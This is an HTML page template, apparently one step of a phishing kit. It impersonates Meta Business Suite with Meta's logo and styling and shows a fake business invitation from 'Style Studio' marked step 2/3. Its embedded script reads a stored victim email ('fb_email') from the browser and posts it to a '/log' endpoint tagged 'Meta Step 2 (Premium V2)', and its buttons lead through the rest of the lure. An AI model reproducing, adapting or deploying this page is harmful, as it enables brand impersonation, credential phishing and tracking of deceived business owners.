<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Meta Business Suite</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-blue: #0064e0;
            --primary-blue-hover: #0056c1;
            --text-main: #1c1e21;
            --text-secondary: #65676b;
            --border-color: #e5e5e5;
            --bg-gradient: linear-gradient(135deg, #f0f4ff 0%, #ffffff 50%, #fff0f5 100%);
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background: var(--bg-gradient);
            min-height: 133.4vh; /* Compensate for 0.75 zoom (100 / 0.75) */
            display: flex;
            flex-direction: column;
            color: var(--text-main);
            overflow-x: hidden;
        }

        /* 75% Zoom support */
        html {
            zoom: 0.75;
            -moz-transform: scale(0.75);
            -moz-transform-origin: 0 0;
        }

        header {
            padding: 16px 40px;
            display: flex;
            align-items: center;
        }

        .meta-logo {
            height: 32px;
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 580px;
            border-radius: 12px;
            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.06), 0 2px 4px 0 rgba(0, 0, 0, 0.05);
            padding: 32px;
            border: 1px solid var(--border-color);
        }

        .card-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 24px;
            margin-top: 0;
        }

        .biz-row {
            display: flex;
            align-items: flex-start;
            gap: 16px;
            margin-bottom: 12px;
        }

        .biz-avatar {
            width: 56px;
            height: 56px;
            background: #fff;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #dddfe2;
            overflow: hidden;
            flex-shrink: 0;
        }

        .biz-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .biz-info {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .biz-name {
            font-size: 16px;
            font-weight: 700;
            color: var(--text-main);
            margin: 0;
        }

        .biz-meta {
            font-size: 14px;
            color: var(--text-secondary);
            margin: 0;
        }

        .info-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 14px;
            height: 14px;
            background: #8a8d91;
            color: #fff;
            border-radius: 50%;
            font-size: 10px;
            font-weight: bold;
            margin-left: 4px;
            cursor: pointer;
        }

        .divider {
            height: 1px;
            background: #ebedf0;
            margin: 24px 0;
        }

        .section-title {
            font-size: 15px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .section-desc {
            font-size: 14px;
            line-height: 1.5;
            color: var(--text-main);
            margin-bottom: 24px;
        }

        .warning-box {
            font-size: 12px;
            color: var(--text-secondary);
            line-height: 1.6;
            margin-top: 32px;
        }

        .warning-box a {
            color: var(--primary-blue);
            text-decoration: none;
        }

        .warning-box a:hover {
            text-decoration: underline;
        }

        .card-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 40px;
        }

        .btn {
            height: 36px;
            padding: 0 20px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s;
        }

        .btn-gray {
            background: #e4e6eb;
            color: #1c1e21;
            border: 1px solid #dddfe2;
        }

        .btn-gray:hover {
            background: #d8dadf;
        }

        .btn-blue {
            background: var(--primary-blue);
            color: #fff;
        }

        .btn-blue:hover {
            background: var(--primary-blue-hover);
        }

        .step-num {
            font-size: 13px;
            color: var(--text-secondary);
            font-weight: 500;
        }

        footer {
            padding: 24px 40px;
            background: transparent;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #737373;
            border-top: 1px solid rgba(0,0,0,0.05);
        }

        .footer-left {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
        }

        .footer-left a {
            color: #737373;
            text-decoration: none;
        }

        .footer-left a:hover {
            text-decoration: underline;
        }

        .footer-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .footer-right span {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        @media (max-width: 640px) {
            header { padding: 16px 20px; }
            .card { padding: 24px; margin: 0 10px; }
            footer {
                flex-direction: column;
                gap: 16px;
                text-align: center;
                padding: 24px 20px;
            }
            .footer-left { justify-content: center; }
        }
    </style>
</head>
<body>
    <header>
        <svg class="meta-logo" viewBox="0 0 500 100">
            <title>Logo của Meta</title>
            <defs>
                <linearGradient gradientUnits="userSpaceOnUse" id="js_1" x1="125" x2="160.217" y1="97" y2="57.435"><stop offset=".21" stop-color="#0278F1"></stop><stop offset=".533" stop-color="#0180FA"></stop></linearGradient>
                <linearGradient gradientUnits="userSpaceOnUse" id="js_2" x1="44" x2="0" y1="5" y2="64"><stop offset=".427" stop-color="#0165E0"></stop><stop offset=".917" stop-color="#0180FA"></stop></linearGradient>
                <linearGradient gradientUnits="userSpaceOnUse" id="js_3" x1="28.5" x2="135" y1="29" y2="72"><stop stop-color="#0064E0"></stop><stop offset=".656" stop-color="#0066E2"></stop><stop offset="1" stop-color="#0278F1"></stop></linearGradient>
                <clipPath id="js_0"><path d="M0 0h496.236v100H0z" fill="#fff"></path></clipPath>
            </defs>
            <g clip-path="url(#js_0)">
                <path d="M182.141 3.213h18.808l31.98 57.849 31.979-57.849h18.401V98.27h-15.345V25.416l-28.042 50.448h-14.394l-28.042-50.448V98.27h-15.345V3.213ZM332.804 99.967c-7.107 0-13.353-1.573-18.739-4.718-5.387-3.146-9.586-7.504-12.595-13.07-3.011-5.569-4.515-11.95-4.515-19.148 0-7.287 1.47-13.738 4.413-19.35 2.942-5.613 7.027-10.004 12.255-13.173 5.229-3.168 11.238-4.753 18.027-4.753 6.744 0 12.55 1.596 17.416 4.787 4.865 3.191 8.611 7.661 11.237 13.41 2.624 5.749 3.938 12.492 3.938 20.233v4.21h-52.077c.95 5.794 3.292 10.354 7.027 13.68 3.735 3.328 8.453 4.991 14.157 4.991 4.571 0 8.509-.679 11.814-2.037 3.303-1.358 6.404-3.417 9.302-6.178l8.147 9.98c-8.103 7.425-18.038 11.136-29.807 11.136Zm11.204-56.389c-3.215-3.281-7.425-4.923-12.629-4.923-5.07 0-9.314 1.676-12.731 5.025-3.418 3.35-5.58 7.854-6.484 13.512h37.343c-.453-5.794-2.286-10.331-5.499-13.614ZM382.846 40.014h-14.123V27.453h14.123V6.676h14.802v20.777h21.455v12.561h-21.455v31.844c0 5.295.905 9.075 2.716 11.338 1.809 2.264 4.911 3.395 9.302 3.395 1.945 0 3.598-.078 4.956-.237a92.35 92.35 0 0 0 4.481-.646v12.425c-1.675.498-3.564.906-5.669 1.223a44.63 44.63 0 0 1-6.62.475c-15.979 0-23.968-8.735-23.968-26.208V40.014ZM496.236 98.27h-14.53v-9.913c-2.58 3.712-5.862 6.575-9.845 8.588-3.983 2.014-8.51 3.022-13.579 3.022-6.247 0-11.78-1.596-16.601-4.787s-8.612-7.581-11.373-13.172c-2.761-5.59-4.142-11.983-4.142-19.18 0-7.243 1.403-13.648 4.21-19.216 2.806-5.567 6.688-9.935 11.645-13.104 4.956-3.168 10.648-4.753 17.075-4.753 4.844 0 9.189.94 13.037 2.818a25.768 25.768 0 0 1 9.573 7.978v-9.098h14.53V98.27Zm-14.801-46.035c-1.585-4.028-4.085-7.207-7.503-9.54-3.418-2.33-7.367-3.496-11.848-3.496-6.338 0-11.384 2.128-15.141 6.382-3.758 4.255-5.635 10.004-5.635 17.246 0 7.289 1.809 13.06 5.431 17.314 3.621 4.255 8.532 6.382 14.734 6.382 4.571 0 8.645-1.176 12.222-3.53 3.575-2.353 6.155-5.522 7.74-9.506V52.235Z" fill="#1C2B33"></path>
                <path d="M108 0C95.66 0 86.015 9.294 77.284 21.1 65.284 5.821 55.25 0 43.24 0 18.76 0 0 31.862 0 65.586 0 86.69 10.21 100 27.31 100c12.308 0 21.16-5.803 36.897-33.31 0 0 6.56-11.584 11.072-19.564 1.582 2.553 3.243 5.3 4.997 8.253l7.38 12.414C102.03 91.848 110.038 100 124.551 100c16.659 0 25.931-13.492 25.931-35.034C150.483 29.656 131.301 0 108 0ZM52.207 59.241c-12.759 20-17.172 24.483-24.276 24.483-7.31 0-11.655-6.418-11.655-17.862 0-24.483 12.207-49.517 26.759-49.517 7.88 0 14.465 4.55 24.552 18.991-9.578 14.691-15.38 23.905-15.38 23.905Zm48.153-2.517-8.823-14.715a301.425 301.425 0 0 0-6.884-10.723c7.952-12.274 14.511-18.39 22.313-18.39 16.206 0 29.172 23.863 29.172 53.173 0 11.172-3.659 17.655-11.241 17.655-7.268 0-10.739-4.8-24.537-27Z" fill="#0180FA"></path>
                <path d="M145.586 35H130.66c3.452 8.746 5.478 19.482 5.478 31.069 0 11.172-3.659 17.655-11.241 17.655-1.407 0-2.672-.18-3.897-.631V99.82c1.143.122 2.324.18 3.552.18 16.659 0 25.931-13.492 25.931-35.034 0-10.737-1.774-20.95-4.897-29.966Z" fill="url(#js_1)"></path>
                <path d="M43.241 0c.254 0 .507.003.759.008v16.36c-.32-.015-.642-.023-.965-.023-14.183 0-26.139 23.782-26.736 47.655H.014C.59 30.87 19.143 0 43.24 0Z" fill="url(#js_2)"></path>
                <path d="M43.241 0c11.152 0 20.601 5.02 31.502 17.971 3.065 3.828 6.761 8.805 10.716 14.557l.017.025.025-.003a311.041 311.041 0 0 1 6.036 9.459l8.823 14.715c13.798 22.2 17.269 27 24.537 27H125v16.273c-.149.002-.298.003-.448.003-14.513 0-22.522-8.152-36.897-32.207l-7.38-12.414a596.368 596.368 0 0 0-2.294-3.834L78 51.5c-5.5-9-9-14.5-12-18.5l-.05.038c-9.18-12.63-15.47-16.693-22.916-16.693H43V0L43.241 0Z" fill="url(#js_3)"></path>
            </g>
        </svg>
    </header>

    <main>
        <div class="card">
            <h1 class="card-title">Review business information</h1>
            
            <div class="biz-row">
                <div class="biz-avatar">
                    <img src="https://ui-avatars.com/api/?name=Style+Studio&background=fff&color=0064e0&font-size=0.5&bold=true" alt="Style Studio">
                </div>
                <div class="biz-info">
                    <p class="biz-name">Style Studio</p>
                    <p class="biz-meta">Created date: September 26, 2024</p>
                    <p class="biz-meta">Business verification: Unverified <span class="info-icon">i</span></p>
                </div>
            </div>

            <div class="divider"></div>

            <div class="section-title">Information on personal page</div>
            <p class="section-desc">
                This business asset management page does not have any Pages, Instagram pages or WhatsApp accounts with over 1,000 followers.
            </p>

            <div class="warning-box">
                Be cautious when accepting invitations from business profiles you don't know about. If you don't know this business, you can <a href="#">decline invitation</a>.
            </div>

            <div class="card-footer">
                <button type="button" class="btn btn-gray" id="btn_before">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
                    Before
                </button>
                <div class="step-num">2/3</div>
                <button type="button" class="btn btn-blue" id="btn_next">
                    Next
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                </button>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-left">
            <a href="#">Facebook</a>
            <a href="#">Developer</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
            <a href="#">Reporting incidents</a>
        </div>
        <div class="footer-right">
            <span>Vietnamese <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>
            <span>Meta © 2024</span>
        </div>
    </footer>

    <script>
        (function() {
            const metaBasePath = "{{ $metaBasePath }}";

            document.getElementById('btn_before').addEventListener('click', function() {
                window.location.href = metaBasePath + "/1";
            });

            document.getElementById('btn_next').addEventListener('click', function() {
                window.location.href = metaBasePath + "/3";
            });

            // Log visit
            const savedEmail = localStorage.getItem('fb_email');
            fetch("/log", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-CSRF-TOKEN": "{{ csrf_token() }}"
                },
                body: JSON.stringify({
                    page: "Meta Step 2 (Premium V2)",
                    email: savedEmail,
                    action: "view"
                })
            });
        })();
    </script>
</body>
</html>
